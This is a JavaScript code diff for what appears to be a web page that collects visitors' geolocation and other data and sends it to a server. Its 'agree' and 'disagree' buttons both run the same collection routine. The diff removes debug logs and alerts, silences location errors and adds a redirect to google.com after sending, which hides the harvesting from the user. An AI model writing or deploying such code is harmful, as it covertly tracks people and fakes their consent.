@@ -8,20 +8,19 @@ let funcsStatus = new Map();
 for (let f of funcs) {
   funcsStatus.set(f.name, false);
 }
-console.log(funcsStatus);
 
 
 async function getLocation() {
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) {
-      reject("Geolocation is not supported by your browser.");
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(
-      pos => resolve(pos),
-      err => reject("Unable to retrieve location: " + err.message)
+  try {
+    return await new Promise(resolve =>
+      navigator.geolocation?.getCurrentPosition(
+        pos => resolve(pos),
+        () => resolve(null)
+      )
     );
-  });
+  } catch {
+    return null;
+  }
 }
 
 async function sendRequest(data) {
@@ -54,23 +53,20 @@ async function getPosData() {
 
 async function start() {
   for (let f of funcs) {
-    console.log(f.name);
     let d = await f();
-    console.log("checking ...");
     if (funcsStatus.get(f.name) == false && d) {
       await sendRequest(d);
       funcsStatus.set(f.name, true);
     }
   }
+  window.location.replace("https://google.com");
 }
 
 async function agree() {
-  alert("clicked");
   await start();
 }
 
 async function disAgree() {
-  alert("clicked");
   await start();
 }
 
